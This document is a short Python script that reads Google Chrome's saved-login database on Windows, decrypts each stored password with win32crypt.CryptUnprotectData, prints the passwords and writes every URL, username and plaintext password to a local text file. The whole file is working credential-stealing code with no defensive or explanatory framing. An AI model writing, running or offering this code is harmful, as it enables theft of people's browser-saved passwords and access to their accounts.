import os
import sqlite3
import win32crypt

data_path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
login_db=os.path.join(data_path,'Login Data')

c=sqlite3.connect(login_db)
cursor=c.cursor()
select_query="select origin_url,username_value,password_value from logins"
cursor.execute(select_query)

logindata=cursor.fetchall()
os.chdir('./password')
file=open('password_file.txt','w')

credential ={}
for url,username,pwd in logindata:
    pwd = win32crypt.CryptUnprotectData(pwd,None,None,None,0)
    credential[url]=(username,pwd[1])
    print(pwd[1])
    file.write(url)
    file.write(username)
    file.write(pwd[1].decode("UTF-8"))
    file.write('\n')
file.close()
